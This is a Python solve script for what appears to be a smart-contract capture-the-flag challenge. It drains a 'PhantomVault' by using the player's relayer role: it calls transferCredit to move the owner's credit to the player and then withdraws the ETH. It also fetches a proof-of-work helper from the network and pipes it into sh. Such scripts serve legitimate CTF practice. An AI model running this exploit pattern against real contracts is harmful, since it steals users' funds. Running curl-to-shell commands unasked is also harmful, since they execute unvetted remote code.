#!/usr/bin/env python3
import requests
import subprocess
import time
import json
import sys
from web3 import Web3
from eth_account import Account

PORTAL_URL = "http://34.2.147.230:8502"

def solve():
    session = requests.Session()

    print("[*] Checking portal status...")
    status = session.get(f"{PORTAL_URL}/status").json()
    print("Current status:", status)

    if not status.get("running"):
        chall_data = session.get(f"{PORTAL_URL}/challenge").json()
        chall_str = chall_data["challenge"]
        print(f"[*] Solving PoW: {chall_str}...")
        res = subprocess.run(["sh", "-c", f"curl -sSfL https://pwn.red/pow | sh -s {chall_str}"], capture_output=True, text=True, check=True)
        sol = res.stdout.strip()
        r_sol = session.post(f"{PORTAL_URL}/solution", json={"solution": sol})
        print("PoW submission:", r_sol.json())
        
        print("[*] Launching instance...")
        r_launch = session.post(f"{PORTAL_URL}/launch")
        print("Launch response:", r_launch.text)
        time.sleep(3)

    data_res = session.get(f"{PORTAL_URL}/data").json()
    print("Instance Data:\n", json.dumps(data_res, indent=2))

    rpc_url = None
    priv_key = None
    setup_addr = None

    for k, v in data_res.items():
        if isinstance(v, dict):
            sub_k = list(v.keys())[0]
            sub_v = list(v.values())[0]
            val_str = str(sub_v).replace("{ORIGIN}", PORTAL_URL)
            if "rpc" in sub_k.lower() or "http" in val_str:
                rpc_url = val_str
            elif "private" in sub_k.lower() or "key" in sub_k.lower():
                priv_key = val_str
            elif "setup" in sub_k.lower() or "contract" in sub_k.lower():
                setup_addr = val_str

    print(f"RPC URL: {rpc_url}")
    print(f"Private Key: {priv_key}")
    print(f"Setup Address: {setup_addr}")

    w3 = Web3(Web3.HTTPProvider(rpc_url))
    assert w3.is_connected(), "Failed to connect to RPC endpoint"
    player_acc = Account.from_key(priv_key)
    player_addr = player_acc.address
    print(f"Player Address: {player_addr}")

    setup_abi = [
        {"inputs":[],"name":"vault","outputs":[{"internalType":"contract PhantomVault","name":"","type":"address"}],"stateMutability":"view","type":"function"},
        {"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
    ]

    vault_abi = [
        {"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
        {"inputs":[],"name":"relayer","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
        {"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
        {"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferCredit","outputs":[],"stateMutability":"nonpayable","type":"function"},
        {"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}
    ]

    setup_contract = w3.eth.contract(address=w3.to_checksum_address(setup_addr), abi=setup_abi)
    vault_addr = setup_contract.functions.vault().call()
    print(f"Vault Address: {vault_addr}")

    vault_contract = w3.eth.contract(address=w3.to_checksum_address(vault_addr), abi=vault_abi)
    owner_addr = vault_contract.functions.owner().call()
    relayer_addr = vault_contract.functions.relayer().call()
    owner_balance = vault_contract.functions.balances(owner_addr).call()
    vault_eth = w3.eth.get_balance(vault_addr)

    print(f"Vault Owner: {owner_addr}")
    print(f"Vault Relayer: {relayer_addr} (Matches player: {relayer_addr == player_addr})")
    print(f"Owner Vault Balance: {w3.from_wei(owner_balance, 'ether')} ETH")
    print(f"Vault Contract Balance: {w3.from_wei(vault_eth, 'ether')} ETH")

    # Step 1: transferCredit(owner_addr, player_addr, owner_balance)
    print("[*] Step 1: Executing transferCredit(owner -> player)...")
    nonce = w3.eth.get_transaction_count(player_addr)
    tx1 = vault_contract.functions.transferCredit(owner_addr, player_addr, owner_balance).build_transaction({
        "from": player_addr,
        "nonce": nonce,
        "gas": 200000,
        "gasPrice": w3.eth.gas_price
    })
    signed_tx1 = w3.eth.account.sign_transaction(tx1, priv_key)
    tx_hash1 = w3.eth.send_raw_transaction(signed_tx1.raw_transaction)
    rec1 = w3.eth.wait_for_transaction_receipt(tx_hash1)
    print(f"[+] transferCredit confirmed! Status: {rec1.status}")

    # Step 2: withdraw(owner_balance)
    print("[*] Step 2: Executing withdraw(player)...")
    nonce += 1
    tx2 = vault_contract.functions.withdraw(owner_balance).build_transaction({
        "from": player_addr,
        "nonce": nonce,
        "gas": 200000,
        "gasPrice": w3.eth.gas_price
    })
    signed_tx2 = w3.eth.account.sign_transaction(tx2, priv_key)
    tx_hash2 = w3.eth.send_raw_transaction(signed_tx2.raw_transaction)
    rec2 = w3.eth.wait_for_transaction_receipt(tx_hash2)
    print(f"[+] withdraw confirmed! Status: {rec2.status}")

    # Verify isSolved
    is_solved = setup_contract.functions.isSolved().call()
    rem_balance = w3.eth.get_balance(vault_addr)
    print(f"Setup.isSolved(): {is_solved}")
    print(f"Remaining Vault ETH: {rem_balance}")

    if is_solved:
        print("[*] Requesting flag from portal...")
        flag_res = session.get(f"{PORTAL_URL}/flag").json()
        flag_text = flag_res.get("flag") or flag_res.get("message")
        print("\n" + "="*70)
        print(f"[🏁] FINAL FLAG: {flag_text}")
        print("="*70)
        return flag_text

if __name__ == "__main__":
    solve()
